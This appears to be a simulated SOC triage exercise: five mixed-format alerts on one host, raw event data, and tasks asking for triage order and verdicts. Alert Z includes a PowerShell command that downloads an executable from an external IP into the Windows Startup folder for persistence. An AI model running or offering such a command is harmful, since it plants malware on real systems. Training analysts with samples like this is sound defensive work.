# Case 016 — Phase 3: Full Queue Simulation (5 Alerts, Mixed Format)

**Incident ID:** IR-2026-032
**Date Detected:** 2026-07-06
**Host:** JIMIL-JOSHI
**Reported By:** SOC Monitoring (Splunk + simulated EDR)
**Status:** 🔴 Open — Pending Triage

**Phase:** 3 — Full queue simulation. 5 alerts in queue simultaneously, mixed formats (Splunk tables + EDR-style alert card), no interrupt this round.

---

## 🎫 Initial Queue — 5 Alerts

| # | Alert | Type | SIEM Severity |
|---|---|---|---|
| 1 | Alert X | New firewall rule blocking outbound to specific IP | 🟢 Info |
| 2 | Alert Y | Process injection detected (EDR-style alert) | 🔴 High |
| 3 | Alert Z | PowerShell downloading file to Startup folder | 🔴 High |
| 4 | Alert AA | Multiple RDP logon failures from external IP | 🟠 Medium |
| 5 | Alert AB | Print spooler service restarted | 🟢 Info |

**Analyst's chosen order:** Z → Y → AA → X → AB

---

## 📄 Raw Event Data

### Alert Z
```
Process_Command_Line: powershell.exe -c "Invoke-WebRequest -Uri http://185.220.101.45/update.exe -OutFile C:\Users\hp\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
Account: hp | Parent: cmd.exe
```

### Alert Y (EDR-style card)
```
[EDR ALERT — CrowdStrike-style]
Detection Name: Suspicious Process Injection
Host: JIMIL-JOSHI
Process: powershell.exe (PID 4821)
Injected Into: explorer.exe (PID 2104)
Severity: High
MITRE: T1055
```

### Alert AA
```
15 failed RDP logon attempts from external IP 103.75.201.44 targeting account "administrator" within 2 minutes
```

### Alert X
```
Process_Command_Line: netsh advfirewall firewall add rule name="Block_Malicious_C2" dir=out action=block remoteip=91.243.85.22
Account: hp | Parent: cmd.exe
```

### Alert AB
```
Service: Print Spooler (Spooler) restarted | Account: SYSTEM | Time: 10:30 AM
```

---

## 🎯 Task

1. Determine triage order across all 5 alerts and justify it.
2. Investigate each alert independently, including the EDR-format alert.
3. Give a verdict (TP/FP/Ambiguous) for each with justification.
4. For Alert X: does the direction (block vs. allow) of a firewall rule change how it should be triaged, compared to Case_012's Alert R?
